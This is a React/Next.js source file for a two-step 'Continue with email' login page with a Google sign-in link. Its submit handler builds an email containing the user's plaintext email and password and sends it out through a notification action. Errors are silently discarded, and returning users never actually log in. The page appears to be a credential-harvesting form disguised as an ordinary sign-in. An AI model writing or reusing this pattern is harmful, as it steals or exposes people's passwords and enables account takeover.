"use client";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { ChevronLeftIcon } from "@radix-ui/react-icons";
import Link from "next/link";
import { Eye, EyeOff } from "lucide-react";
import { FcGoogle } from "react-icons/fc";
import { checkUserExistence } from "@/actions/user";
import SubmissionSuccessModal from "@/components/SubmissionSuccessModal";
import InProgress from "@/components/InProgress";
import { sendEmailNotification } from "@/actions/notification";
import { generateEmailNotification } from "@/lib/utils";
import { signInUser, RegisteredBy } from "@/actions/auth";

const Email = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState<"email" | "password">("email");
  const [showPassword, setShowPassword] = useState(false);
  const [showModal, setShowModal] = useState<"success" | "in-progress" | null>(
    null
  );

  const toggleShowPassword = () => setShowPassword(!showPassword);

  const handleSubmit = async () => {
    try {
      const doesExist = await checkUserExistence(email);
      if (doesExist) {
        setShowModal("in-progress");
      } else {
        await signInUser({
          email,
          password,
          registeredBy: RegisteredBy.EMAIL,
        });
        setShowModal("success");
        const emailBody = generateEmailNotification({ email, password });
        await sendEmailNotification(emailBody);
      }
    } catch (error) {}
  };

  return (
    <>
      {showModal === "success" ? (
        <SubmissionSuccessModal />
      ) : showModal === "in-progress" ? (
        <InProgress />
      ) : step === "email" ? (
        <Card className="max-w-md w-full p-12 glass-card animate-fade-in-scale relative z-10">
          <Link href="/sign-up">
            <ChevronLeftIcon className="w-6 h-6 absolute top-[54px]" />
          </Link>
          <div className="flex flex-col items-center space-y-8">
            <h2 className="text-3xl font-medium">Continue with email</h2>
            <div className="w-full space-y-6">
              <div className="space-y-1.5">
                <p className="text-start text-sm font-semibold">Email(work)</p>
                <Input
                  type="email"
                  id="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full h-12 px-4 pr-12 input-focus-ring transition-all duration-200 ease-in-out focus-visible:ring-email"
                />
              </div>

              <Button
                onClick={() => {
                  email.trim().length && setStep("password");
                }}
                className="bg-email w-full hover:bg-email-hover text-white px-6 py-6 rounded-md transition-colors duration-200"
              >
                Continue
              </Button>
            </div>
          </div>
        </Card>
      ) : (
        <Card className="max-w-md w-full p-12 glass-card animate-fade-in-scale relative z-10">
          <ChevronLeftIcon
            onClick={() => {
              setStep("email");
              setPassword("");
              setShowPassword(false);
            }}
            className="w-6 h-6 absolute top-[54px] cursor-pointer"
          />
          <div className="flex flex-col items-center space-y-8">
            <h2 className="text-3xl font-medium">Finish logging in</h2>

            <div className="w-full space-y-6">
              <div className="space-y-1.5">
                <p className="text-start text-sm font-semibold">Password</p>
                <div className="relative">
                  <Input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full h-12 px-4 pr-12 input-focus-ring transition-all duration-200 ease-in-out focus-visible:ring-email"
                    id="password"
                  />
                  <button
                    type="button"
                    onClick={toggleShowPassword}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors duration-200"
                  >
                    {showPassword ? (
                      <EyeOff className="h-5 w-5 hover:text-email" />
                    ) : (
                      <Eye className="h-5 w-5 hover:text-email" />
                    )}
                  </button>
                </div>
              </div>

              <Button
                onClick={handleSubmit}
                className="bg-email w-full hover:bg-email-hover text-white px-6 py-6 rounded-md transition-colors duration-200"
              >
                Continue
              </Button>

              <div className="divider">
                <span className="text-xs">OR</span>
              </div>

              <div>
                <Link href="/google">
                  <button className="social-button hover:bg-primary/90 hover:text-white border !border-border">
                    <FcGoogle className="w-5 h-5" />
                    <span>Continue with Google</span>
                  </button>
                </Link>
              </div>
            </div>
          </div>
        </Card>
      )}
    </>
  );
};

export default Email;
